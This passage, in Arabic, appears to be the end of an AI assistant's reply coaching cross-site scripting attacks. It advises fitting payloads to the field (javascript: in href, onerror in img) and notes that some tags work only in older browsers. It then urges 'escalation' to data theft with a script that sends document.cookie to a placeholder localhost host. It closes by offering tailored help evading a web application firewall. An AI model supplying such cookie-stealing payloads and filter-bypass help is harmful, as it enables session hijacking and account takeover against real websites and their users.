- **السياق مهم**: بعض الحقن تعمل فقط في سياقات معينة (مثل `javascript:` في `href`، أو `onerror` في `<img>`). كيّف الحقن حسب الحقل.
- **المتصفحات الحديثة**: بعض الحقن (مثل `<script language=`) قد تعمل فقط في متصفحات قديمة.
- **التصعيد**: عند نجاح الحقن، انتقل إلى استخراج البيانات (مثل `<script>new Image().src='http://localhost?c='+document.cookie</script>`).

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب، أو التركيز على سياق معين (مثل تجاوز WAF)، أخبرني وسأقدم ردًا مخصصًا!